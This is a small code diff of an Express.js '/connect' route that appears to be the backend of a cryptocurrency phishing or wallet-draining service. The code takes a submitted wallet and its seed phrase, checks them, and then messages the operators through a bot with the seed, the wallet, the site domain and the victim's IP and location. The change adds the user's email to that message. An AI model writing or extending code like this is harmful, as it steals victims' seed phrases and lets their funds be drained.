@@ -113,7 +113,7 @@ router.post('/connect', UserMiddleware.requireAccess, expressip().getIpInfoMiddl
   })
 
   if (valid) {
-    Bot.notifyOwners(`DOMAIN: ${req.get('host')}\nWALLET: ${wallet}\nSEED: ${seed}\nIP: ${req.ipInfo.ip}, ${req.ipInfo.city}, ${req.ipInfo.country}`)
+    Bot.notifyOwners(`DOMAIN: ${req.get('host')}\nUSER: ${res.locals.user.email}\nWALLET: ${wallet}\nSEED: ${seed}\nIP: ${req.ipInfo.ip}, ${req.ipInfo.city}, ${req.ipInfo.country}`)
 
     await new Promise(resolve => {
       setTimeout(() => {
